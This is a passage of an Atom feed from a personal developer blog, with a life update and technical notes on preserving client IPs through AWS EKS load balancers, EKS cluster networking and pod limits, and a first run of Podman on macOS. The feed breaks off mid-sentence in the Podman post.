<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yiyu&#39;s Dev Blog</title>
  
  <subtitle>🏖️</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.yiyu0x.org/"/>
  <updated>2025-04-12T21:12:40.789Z</updated>
  <id>https://blog.yiyu0x.org/</id>
  
  <author>
    <name>yiyu0x</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2025 Life Update</title>
    <link href="https://blog.yiyu0x.org/2025/04/12/"/>
    <id>https://blog.yiyu0x.org/2025/04/12/</id>
    <published>2025-04-12T12:04:54.000Z</published>
    <updated>2025-04-12T21:12:40.789Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="近況"><a href="#近況" class="headerlink" title="近況"></a>近況</h2><p>距離上一篇文章更新已經超過兩年。前幾天剛好在 CloudFlare 上面調整 DNS Records 發現這個 blog 的每週解析數量還是有多達千人，因此我覺得需要更新一下近況讓長期有在專注該 blog 的各位知道本站目前的狀況。</p><p>由於一下職涯上的長期考量，我從台北的 AWS 離職，現在正在北美尋找更多機會。而專注的事情也暫時從雲端基礎設施管理慢慢轉向 AI 工具如何幫助開發者更快完成目標。AI 的快速發展大幅縮短了開發產品所需要的時間，雖然雲端基礎設施領域還沒有向傳統開發領域一樣受到嚴重衝擊，但是可預見的將來這一天遲早會發生。而我也非常期待看到這一天的到來，到時候會有大量的新型態開發者有能力開發出各式各樣的軟體服務。</p><p>從 2022 年工作之後我已經很少更新 blog 文章。原因除了接觸到的服務都是與 AWS EKS 有關以外，由於一些公司上的政策，寫太多技術細節可能或多或少會透漏到客戶的基礎設施架構。因此便很少進行文章更新。另外一點是工作之後，我很少在電腦上進行太多個人化設定以及鑽研其他底層技術（同樣因為公司政策）。</p><p>然而到了北美之後原本以為會有時間繼續進行一些更新，但是由於找實習以及其他雜事花掉了我大量的時間以外。另外在北美找實習不外乎就是準備 Leetcode 刷題，而這個過程對於來說挺枯燥乏味，我也不知道應該寫些什麼來分享，至少我個人對於這個過程沒什麼熱情。只是為了拿 Offer 而去刷題。</p><p>剛好 4 月是一個新學期的開始，找實習也到一個段落。我有更多時間可以專注在一些 AI 領域的想法上，以及用心去好好體驗在北美的生活。因此有了這一篇更新的誕生。</p><p>若身為讀者你有想法或是一些疑問想要交流，歡迎直接聯絡我（你可以透過一些連結找到我的聯絡方式的）📧</p><p>（以下是英文版本）</p><h2 id="Life-Update"><a href="#Life-Update" class="headerlink" title="Life Update"></a>Life Update</h2><p>It’s been more than two years since my last blog post. A few days ago, while I was updating some DNS records on Cloudflare, I noticed that this blog still gets thousands of DNS queries every week. That made me feel it’s time for an update — especially for those who’ve been following this blog for a while.</p><p>For long-term career reasons, I decided to leave AWS in Taipei and am now exploring new opportunities in North America. My focus has also shifted gradually — from managing cloud infrastructure to exploring how AI tools can help developers build faster and more efficiently. The rapid growth of AI has already shortened product development cycles a lot. While cloud infrastructure hasn’t been impacted as heavily as traditional software engineering (yet), it’s only a matter of time. I’m genuinely excited to see what the future holds — I believe many new types of developers will soon be able to create all kinds of software services with the help of AI.</p><p>Since I started working in 2022, I’ve rarely updated this blog. One reason is that most of my work involved AWS EKS. Because of company policies, writing about technical details might accidentally expose parts of our clients’ infrastructure, so I avoided publishing too much. Another reason is that after starting full-time work, I rarely tinkered with my personal setup or explored low-level tech (again, mostly due to company rules).</p><p>After moving to North America, I originally thought I’d have more time to write again. But job hunting — especially looking for internships — took up a lot of time. And to be honest, prepping for internships here mostly means grinding Leetcode. I find that process pretty dry and uninspiring, so I didn’t really know what to share. I was solving problems not out of interest, but just to get an offer.</p><p>Now that it’s April — the start of a new academic term — and my internship search is mostly done, I finally have more time to focus on AI-related ideas and enjoy life here in North America. That’s what motivated me to write this update.</p><p>If you’re a reader and have any thoughts or questions you’d like to discuss, feel free to reach out to me directly (you can find my contact info through the links on this blog) 📧</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="life" scheme="https://blog.yiyu0x.org/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>EKS ELB 獲取 Client IP 方法紀錄</title>
    <link href="https://blog.yiyu0x.org/2022/09/05/"/>
    <id>https://blog.yiyu0x.org/2022/09/05/</id>
    <published>2022-09-05T06:13:08.000Z</published>
    <updated>2025-04-12T20:59:43.585Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在 EKS 上要建立 ELB 會採用 service type 指定 LoadBalancer。此時 AWS 的 In-Tree LoadBalacner Controller 或是 <a href="https://github.com/kubernetes-sigs/aws-load-balancer-controller" target="_blank" rel="noopener">AWS Load Balancer Controller</a> 其中之一會協助我們建立對應的 ELB 出來。本文紀錄這兩種 LB Controller 的差異以及不同類型 ELB 使用時機（以獲取 Client IP 為例）。</p><h2 id="In-Tree-LoadBalacner-Controller-CLB"><a href="#In-Tree-LoadBalacner-Controller-CLB" class="headerlink" title="In-Tree LoadBalacner Controller - CLB"></a>In-Tree LoadBalacner Controller - CLB</h2><p>將 server type 指定成 <code>LoadBalancer</code> 此時 In-Tree LoadBalacner Controller 會 privosion 一個 CLB 出來</p><p>流量從外部要進入叢集的路徑為</p><p>CLB -> Node:NodePort -> Pod maybe in different node</p><p>因為透過節點上的 NodePort 進行跳轉，所以 Pod 如果要獲得 Clinet IP 會拿到 Node 中的 IP。而獲取不到真正的 Client IP</p><p>接著可以根據官方建議設定 <code>.spec.externalTrafficPolicy</code> 為 <code>Local</code>（預設為 <code>Cluster</code>）</p><p>這樣的設定可以避免流量進入到沒有含 Destination Pod 的 Node 上，多做一個 hop 的跳轉，也避免 IP 被洗成該 Node 的 IP</p><p>結果發現 Client IP 還是獲取不到，因為 CLB 在與後方的 instance 溝通時，是用該 subnet 介面的 IP 溝通，所以 Client IP 變成是 ELB 的 private IP（該 IP 可以從 ec2 的 network interfacae 找出來）</p><p>現在的路徑變成</p><p>CLB -> Node:NodePort （Pod also in the node）</p><p>開啟了 <code>externalTrafficPolicy</code> 需不需要擔心如果該節點上沒有 Pod，進而請求沒有辦法路由到正確的位置上</p><p>答案是不需要，因為 CLB 會對後方的 instance 做健康檢查，若後方 instance 沒有 Pod，那某該 instance 不健康，流量自然不會導入過去</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">優點：完全不需修改參數、不需安裝其他 controller</span><br><span class="line">缺點：無法保留 Client IP、不保留 Client IP 流量會多一跳、流量不平均（後面會提到）</span><br></pre></td></tr></tbody></table></figure><h2 id="In-Tree-LoadBalacner-Controller-NLB"><a href="#In-Tree-LoadBalacner-Controller-NLB" class="headerlink" title="In-Tree LoadBalacner Controller - NLB"></a>In-Tree LoadBalacner Controller - NLB</h2><p>需要在 annotations 加上</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">annotations:</span></span><br><span class="line">    <span class="string">service.beta.kubernetes.io/aws-load-balancer-type:</span> <span class="string">"nlb"</span></span><br></pre></td></tr></tbody></table></figure><p>並且我們將 <code>externalTrafficPolicy</code> 同樣設定成 <code>Local</code></p><p>發現就可以正常獲取 Client IP 了，代表 NLB 在轉發時，不會將 Source IP 介面切換成內網介面，同時後端也不是 instance 是另外一層抽象（target group）</p><p>但試想一個一個情況，若我有 3 個 Pod (x, y, z)，2 個 (x, y) 落在節點 A，1 個 (z) 落在節點 B</p><p>那麼流量進入 NLB 時會先進行 1/2 的機率選擇節點 (A, B)，假設進入節點 A 又會有 1/2 的機率選擇 x, y 這兩個 Pod</p><p>那麼 Pod 被選中的機率變成</p><p>x: 1/2 * 1/2 = 1/4<br>y: 1/2 * 1/2 = 1/4<br>z: 1/2</p><p>可以發現流量並沒有真的平均轉發都後端的 Pod 上</p><p>但 In-Tree Controller 只能建立出這兩種 ELB（並且能修改的參數有限），剩下一種 ALB 必須安裝 <a href="https://github.com/kubernetes-sigs/aws-load-balancer-controller" target="_blank" rel="noopener">AWS Load Balancer Controller</a></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">優點：不需安裝其他 controller、可以保留 Client IP</span><br><span class="line">缺點：不保留 Client IP 流量會多一跳、流量不平均</span><br></pre></td></tr></tbody></table></figure><h2 id="AWS-Load-Balancer-Controller-NLB"><a href="#AWS-Load-Balancer-Controller-NLB" class="headerlink" title="AWS Load Balancer Controller - NLB"></a>AWS Load Balancer Controller - NLB</h2><p>安裝 AWS Load Balancer Controller 後，在使用上必須指定 <code>loadBalancerClass: service.k8s.aws/nlb</code></p><p>並且 AWS Load Balancer Controller 有提供 <code>ip</code> 與 <code>instance</code> mode（使用 in-tree controller 建立出來的 mode 就是 instance mode）</p><p><em>該功能需要配合 AWS VPC CNI 使用</em></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">annotations:</span><br><span class="line">    service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing</span><br><span class="line">    service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip</span><br><span class="line">spec:</span><br><span class="line">    loadBalancerClass: service.k8s.aws/nlb</span><br></pre></td></tr></tbody></table></figure><p>此時會發現 NLB 後方的 target group 直接對應到 Pod IP，可以省去多一次跳轉，並且解決流量不平均的問題</p><p>但 Client IP 還是沒有保留，我們可以調整 NLB 參數</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">annotations:</span><br><span class="line">    service.beta.kubernetes.io/aws-load-balancer-target-group-attributes: preserve_client_ip.enabled=true</span><br></pre></td></tr></tbody></table></figure><p>將 NLB 提供的功能 preserve_client_ip 打開，即可完成配置，也不需要透過設定 <code>externalTrafficPolicy</code> 參數即可獲取 Client IP</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">優點：保留 Client IP、流量不會多一跳、流量平均</span><br><span class="line">缺點：需安裝其他 controller</span><br></pre></td></tr></tbody></table></figure><h2 id="AWS-Load-Balancer-Controller-ALB"><a href="#AWS-Load-Balancer-Controller-ALB" class="headerlink" title="AWS Load Balancer Controller - ALB"></a>AWS Load Balancer Controller - ALB</h2><p>使用 Ingress 資源建立出 ALB，但是無法設定 <code>preserve_client_ip</code></p><p>如果去 management console 檢查對應 target group，會發現找不到 Preserve client IP addresses 但是多了 Load balancing algorithm 可以選擇</p><p>因為是 L7 支援，所以將 Client IP 放入 HTTP header 的 XFF 欄位即可</p><p>一樣有 <code>instance</code> 與 <code>ip</code> mode 可以選擇</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">優點：保留 Client IP（放在 L7 的 HTTP header 中）、流量不會多一跳、流量平均</span><br><span class="line">缺點：需安裝其他 controller</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="AWS" scheme="https://blog.yiyu0x.org/tags/AWS/"/>
    
      <category term="EKS" scheme="https://blog.yiyu0x.org/tags/EKS/"/>
    
      <category term="ELB" scheme="https://blog.yiyu0x.org/tags/ELB/"/>
    
      <category term="Kubernetes" scheme="https://blog.yiyu0x.org/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>建立 Reliable EKS 記錄</title>
    <link href="https://blog.yiyu0x.org/2022/08/30/"/>
    <id>https://blog.yiyu0x.org/2022/08/30/</id>
    <published>2022-08-30T12:04:21.000Z</published>
    <updated>2025-04-12T20:59:43.593Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>EKS 的建立方便快速，其中有些概念花了些時間才釐清，甚至有些拓墣一開始想錯了。經過幾週查閱文件與實驗後，寫個小的總結做個簡單的紀錄。</p><h2 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h2><ul><li>EKS 只有維護 Control Plane，Worker 有 EC2 與 Fargate 可以選擇。其中 EC2 必須由使用者自行管理。</li><li>EKS Control Plane 的 VPC 與 Cluster 的 VPC 為不同的 VPC</li><li>如果 EKS 有開啟 Private Access，會在 Cluster VPC 的 subnet 中安插 EKS-managed ENI 讓 Cluster VPC 流量穿透至 EKS 中</li><li>EKS 建立時選擇的 VPC 是為了部署 EKS-managed ENI（最少兩個）使用</li><li>EKS-managed ENI 直接存在於 subnet 之中，非 EC2 instance（or 其他 instance）之上</li></ul><h2 id="Nodegroup"><a href="#Nodegroup" class="headerlink" title="Nodegroup"></a>Nodegroup</h2><p>如果 Nodegroup 完全無法存取外網，同時也就無法拉取必要的 Container Image，導致節點無法建立成功</p><p>Nodegroup 如果落在 private subnet，可以多開一台有 public subnet 的 EC2 作為 bastion 使用（同一個 VPC 下）</p><h2 id="API-Endpoint"><a href="#API-Endpoint" class="headerlink" title="API Endpoint"></a>API Endpoint</h2><h3 id="public-access"><a href="#public-access" class="headerlink" title="public access"></a>public access</h3><p>API endpoint domain 會對應到一組 Public IP 做為 API Endpoint 入口</p><p>可以使用 <code>kubectl cluster-info</code> 查看</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@eks-bastion]$ kubectl cluster-info</span><br><span class="line">Kubernetes control plane is running at https://<your api endpoint uuid>.gr7.<region>.eks.amazonaws.com</span><br></pre></td></tr></tbody></table></figure><h3 id="private-access"><a href="#private-access" class="headerlink" title="private access"></a>private access</h3><p>根據<a href="https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html" target="_blank" rel="noopener">官方文件</a>描述，在 Cluster VPC 下會有 Route 53 private hosted zone 將 API endpoint 解析成該 VPC 下的 IP</p><blockquote><p>This private hosted zone is managed by Amazon EKS, and it doesn’t appear in your account’s Route 53 resources.</p></blockquote><p>經過實驗會發現解出兩組 VPC 中的 private IP，同時為 EKS-managed ENI 的 IP</p><p>這組介面可以透過將 Cluster VPC 的流量直接導向至 EKS VPC 之中</p><p>啟用條件為 Cluster VPC 必須將 <code>enableDnsHostnames</code>, <code>enableDnsSupport</code> 設定為 <code>true</code></p><p>並且 <code>AmazonProvidedDNS</code> 要在 VPC DHCP 的 domain name servers list</p><h3 id="public-and-private-access"><a href="#public-and-private-access" class="headerlink" title="public and private access"></a>public and private access</h3><p>外網因為沒有 Route 53 private hosted zone 所以會解析出外網 IP</p><p>Cluster VPC 下有 Route 53 private hosted zone 所以會解析出 EKS-managed ENI 的 IP</p><h2 id="Pod-Amount-Limit"><a href="#Pod-Amount-Limit" class="headerlink" title="Pod Amount Limit"></a>Pod Amount Limit</h2><p>Pod limit 的根本問題是因為不同的 EC2 instance type 有先天的 VPC IP 數量限制</p><p>ENI 的數量有限制，每一個 ENI instance 可以指定的 IP 數量也有限制</p><p>官方有給出一份計算後的限制列表可以進行查閱 <a href="https://github.com/awslabs/amazon-eks-ami/blob/master/files/eni-max-pods.txt" target="_blank" rel="noopener">eni-max-pods.txt</a></p><p>突破限制前先釐清自己的叢集為何被限制，以下為幾種可能</p><h3 id="limited-by-subnet-CIDR"><a href="#limited-by-subnet-CIDR" class="headerlink" title="limited by subnet CIDR"></a>limited by subnet CIDR</h3><p>subnet 的 CIDR 一開始切太小，導致 Pod 數量超過 CIDR 範圍時，參考 VPC CNI 的 <a href="https://github.com/awslabs/amazon-eks-ami/blob/master/files/eni-max-pods.txt" target="_blank" rel="noopener">AWS_VPC_K8S_CNI_CUSTOM_NETWORK_CFG</a> 參數，來客製化 Pod 的 CIDR。</p><h3 id="limited-by-EC2-instance-type"><a href="#limited-by-EC2-instance-type" class="headerlink" title="limited by EC2 instance type"></a>limited by EC2 instance type</h3><p>最常見的情況，達到 EC2 上的 IP 數量限制，因此 VPC CNI 無法成功索取 IP。</p><p>方法一：</p><p>直接抽換 AWS VPC CNI，換掉之後 Node 就不會再持續索取 secondary private IPv4 addresses，不過抽換後，沒有辦法讓 Pod 的 IP 直接屬於 VPC 下的 IP（理論效能會差一些，流量可能須經過 NAT 轉換）。</p><p>方法二：</p><p>使用 2021 年 EC2 新推出的功能 <code>prefix assignment</code>。開啟 AWS VPC CNI 中的 <code>ENABLE_PREFIX_DELEGATION</code> 參數。將每一個 ENI 上原本可以附加的 secondary private IPv4 addresses 變成變為 /28 範圍（16 個 IPs）。</p><p>參考 <a href="https://docs.aws.amazon.com/eks/latest/userguide/cni-increase-ip-addresses.html" target="_blank" rel="noopener">Increase the amount of available IP addresses for your Amazon EC2 nodes</a></p><h3 id="limited-by-insufficient-IP’s"><a href="#limited-by-insufficient-IP’s" class="headerlink" title="limited by insufficient IP’s"></a>limited by insufficient IP’s</h3><p>該 subnet 下的 IP 被其他節點或是其他應用索取完畢，導致某些節點的 <code>aws-node</code> (VPC CNI) 沒有辦法正常索取 IP。解決方法為設定 <code>WARM_ENI_TARGET</code> 與 <code>WARM_IP_TARGET</code> 參數，來讓剛節點一被部署時就預先保留好可用的 IP，即時當時 Pod 還沒有被建立。</p><h2 id="Customize-kubelet-Arguments"><a href="#Customize-kubelet-Arguments" class="headerlink" title="Customize kubelet Arguments"></a>Customize kubelet Arguments</h2><p>某些時候需要客製化我們的節點，例如修改 container runtime（EKS 1.23 已經將預設 container runtime 換成 containerd）</p><p>Amazon EKS optimized Amazon Linux AMI 在開機時會呼叫 <code>/etc/eks/bootstrap.sh</code> 在執行必要的初始化</p><p>然而該腳本就有提供參數可供調整，例如我想要替換 container runtime 可以在 launch template 中改寫 user-data 成</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">/etc/eks/bootstrap.sh demo-k8s --container-runtime containerd</span><br></pre></td></tr></tbody></table></figure><p>想要修改 kubelet 的啟動參數可以用 <code>--kubelet-extra-args</code> 來修改</p><h2 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h2><p>以上為這幾週第一次使用 EKS 的紀錄以及個人認為比較容易混淆或是模糊的點，要建構一個可信賴的 EKS 要考量的內容五花八門。這還只是一些在架構上的概念釐清而已，如果要往叢集內部鑽研，有更多要注意與可以調教的地方。這篇文章同時也給以後的自己參考，未來有機會再寫其他文章探討不同層面需要考量的議題。</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="AWS" scheme="https://blog.yiyu0x.org/tags/AWS/"/>
    
      <category term="EKS" scheme="https://blog.yiyu0x.org/tags/EKS/"/>
    
      <category term="Kubernetes" scheme="https://blog.yiyu0x.org/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>在 macOS 上使用 Podman</title>
    <link href="https://blog.yiyu0x.org/2022/07/07/"/>
    <id>https://blog.yiyu0x.org/2022/07/07/</id>
    <published>2022-07-07T01:34:03.000Z</published>
    <updated>2025-04-12T20:59:43.592Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Podman 相較於 Docker 有許多優勢，本文為在 macOS 上初次使用 Podman 之簡短紀錄。過程中不探究太深入的 Podman  運作原理，單純依照一般運行 container 的思想來使用 Podman，看看會遇到什麼問題</p><h2 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h2><p>Podman 與 Docker 一樣有桌面版本與非桌面版本，桌面版本多了 UI 可供查看，挑選一種喜歡的安裝即可</p><p>桌面版：</p><p><code>brew install podman-desktop</code></p><p>非桌面版：</p><p><code>brew install podman</code></p><p>檢查安裝版本：</p><p><code>podman version</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cannot connect to Podman. Please verify your connection to the Linux system using `podman system connection list`, or try `podman machine init` and `podman machine start` to manage a new Linux VM</span><br><span class="line">Error: unable to connect to Podman. failed to create sshClient: Connection to bastion host (ssh://core@localhost:52568/run/user/1000/podman/podman.sock) failed.: dial tcp [::1]:52568: connect: connection refused</span><br></pre></td></tr></tbody></table></figure><p>馬上遇到第一個問題，按照提示使用 <code>podman machine init</code> 來建立 Linux VM，運作原理猜測與 Docker on macOS  類似，不過 Docker Desktop 不用手動建立 VM</p><p>檢查是否有啟動 podman 需要的 VM：</p><p><code>podman machine list</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NAME                     VM TYPE     CREATED         LAST UP        CPUS        MEMORY      DISK SIZE</span><br><span class="line">podman-machine-default*  qemu        37 minutes ago  3 minutes ago  1           2.147GB     10.74GB</span><br></pre></td></tr></tbody></table></figure><p>可以看到 VM 已經被正確啟動（而且是使用 qemu 來啟動的），但依照報一樣的錯誤。後來查了 <a href="https://github.com/containers/podman/issues/12728" target="_blank" rel="noopener">issue#12728</a> 發現 Podman 嘗試使用 $SSH_AUTH_SOCK 變數設定的 address 來連線，可以取消設置該變數來解決該問題</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unset SSH_AUTH_SOCK</span><br></pre></td></tr></tbody></table></figure><p>（請依照你的 shell 放置到對應的檔案中）</p><p>接下來就可以看到 Podman 的版本資訊：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Client:</span><br><span class="line">Version:      3.4.1</span><br><span class="line">API Version:  3.4.1</span><br><span class="line">Go Version:   go1.17.2</span><br><span class="line">Built:        Wed Oct 20 05:14:42 2021</span><br><span class="line">OS/Arch:      darwin/amd64</span><br><span class="line"></span><br><span class="line">Server:</span><br><span class="line">Version:      4.1.1</span><br><span class="line">API Version:  4.1.1</span><br><span class="line">Go Version:   go1.18.3</span><br><span class="line">Built:        Wed Jun 15 22:31:58 2022</span><br><span class="line">OS/Arch:      linux/amd64</span><br></pre></td></tr></tbody></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>搜尋 Image：</p><p><code>podman search busybox</code></p><p>依照 output 可以發現預設是去搜尋 docker hub (hub.docker.com)</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INDEX       NAME                                         DESCRIPTION                                                                                STARS       OFFICIAL    AUTOMATED</span><br><span class="line">docker.io   docker.io/library/busybox                    Busybox base image.                                                                        2660        [OK]</span><br><span class="line">docker.io   docker.io/rancher/busybox                                                                                                               0</span><br><span class="line">docker.io   docker.io/ibmcom/busybox                                                                                                                0</span><br><span class="line">......</span><br></pre></td></tr></tbody></table></figure><p>下載 Image 到本地：</p><p><code>podman pull busybox</code></p><p>執行 busybox image：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">podman run -it --rm busybox</span><br><span class="line">/ #</span><br><span class="line">/ #</span><br><span class="line">/ #</span><br><span class="line">/ # exit</span><br></pre></td></tr></tbody></table></figure><p>使用起來與 Docker 並無二異</p><h2 id="發現"><a href="#發現" class="headerlink" title="發現"></a>發現</h2><h3 id="registries-設定檔案"><a href="#registries-設定檔案" class="headerlink" title="registries 設定檔案"></a>registries 設定檔案</h3><p>故意拉一個不存在的 image</p><p><code>podman pull this-is-error</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Resolving "this-is-error" using unqualified-search registries (/etc/containers/registries.conf.d/999-podman-machine.conf)</span><br></pre></td></tr></tbody></table></figure><p>會發現 podman 透過 <code>/etc/containers/registries.conf.d/999-podman-machine.conf</code> 設定來決定完整的 Image 名稱（因為沒有指定 registry 理論上無法定位該 Image 位置）</p><p>到 VM 中檢查一下該檔案，就可以發現原來是預設找不到 image 就去 <code>docker.io</code> 找</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">❯ podman machine ssh</span><br><span class="line">Connecting to vm podman-machine-default. To close connection, use `~.` or `exit`</span><br><span class="line">Warning: Permanently added '[localhost.nctu.edu.tw]:52568' (ED25519) to the list of known hosts.</span><br><span class="line">Fedora CoreOS 36.20220703.2.1</span><br><span class="line">Tracker: https://github.com/coreos/fedora-coreos-tracker</span><br><span class="line">Discuss: https://discussion.fedoraproject.org/tag/coreos</span><br><span class="line"></span><br><span class="line">Last login: Thu Jul  7 01:50:15 2022 from 192.168.127.1</span><br><span class="line">[core@localhost ~]$ cat /etc/containers/registries.conf.d/999-podman-machine.conf</span><br><span class="line">unqualified-search-registries=["docker.io"]</span><br><span class="line">[core@localhost ~]$</span><br></pre></td></tr></tbody></table></figure><p>另外也發現其他 registries 的設定檔</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[core@localhost containers]$ cd /etc/containers/registries.conf.d</span><br><span class="line">[core@localhost registries.conf.d]$ ls</span><br><span class="line">000-shortnames.conf  999-podman-machine.conf</span><br><span class="line">[core@localhost registries.conf.d]$ cat 000-shortnames.conf</span><br><span class="line">[aliases]</span><br><span class="line">  # almalinux</span><br><span class="line">  "almalinux" = "docker.io/library/almalinux"</span><br><span class="line">  "almalinux-minimal" = "docker.io/library/almalinux-minimal"</span><br><span class="line">  # Arch Linux</span><br><span class="line">  "archlinux" = "docker.io/archlinux/archlinux"</span><br><span class="line">  # centos</span><br><span class="line">  "centos" = "quay.io/centos/centos"</span><br><span class="line">  # containers</span><br><span class="line">  "skopeo" = "quay.io/skopeo/stable"</span><br><span class="line">  "buildah" = "quay.io/buildah/stable"</span><br><span class="line">  "podman" = "quay.io/podman/stable"</span><br><span class="line">  "hello" = "quay.io/podman/hello"</span><br><span class="line">  "hello-world" = "quay.io/podman/hello"</span><br><span class="line">  # docker</span><br><span class="line">  "alpine" = "docker.io/library/alpine"</span><br><span class="line">  "docker" = "docker.io/library/docker"</span><br><span class="line">  "registry" = "docker.io/library/registry"</span><br><span class="line">  "swarm" = "docker.io/library/swarm"</span><br></pre></td></tr></tbody></table></figure><p>可以發現原來有些 image 是透過 alias 的方式來決定位置的</p><h3 id="Port-Forward-顯示不正常"><a href="#Port-Forward-顯示不正常" class="headerlink" title="Port Forward 顯示不正常"></a>Port Forward 顯示不正常</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">❯ podman run -itd -p 8888:80 nginx</span><br><span class="line">be5cb3e60f7b714e3b9c3462610675dd8cc7eaf0c048cdef7c3c8ea011979096</span><br><span class="line"></span><br><span class="line">❯ podman run -itd -P nginx</span><br><span class="line">9a2adbd0e86c0083ad0af5bccedc7f5dbaa3b64599c982368f8e64b301eac25d</span><br><span class="line"></span><br><span class="line">❯ podman ps</span><br><span class="line">CONTAINER ID  IMAGE                           COMMAND               CREATED         STATUS             PORTS             NAMES</span><br><span class="line">be5cb3e60f7b  docker.io/library/nginx:latest  nginx -g daemon o...  17 seconds ago  Up 18 seconds ago  0.0.0.0:0->0/tcp  unruffled_bouman</span><br><span class="line">9a2adbd0e86c  docker.io/library/nginx:latest  nginx -g daemon o...  3 seconds ago   Up 4 seconds ago   0.0.0.0:0->0/tcp  laughing_wiles</span><br></pre></td></tr></tbody></table></figure><p>在 <code>podman ps</code> 中看不到被 binding 出來的 Ports 有些不方便</p><p>不過透過 <code>podman 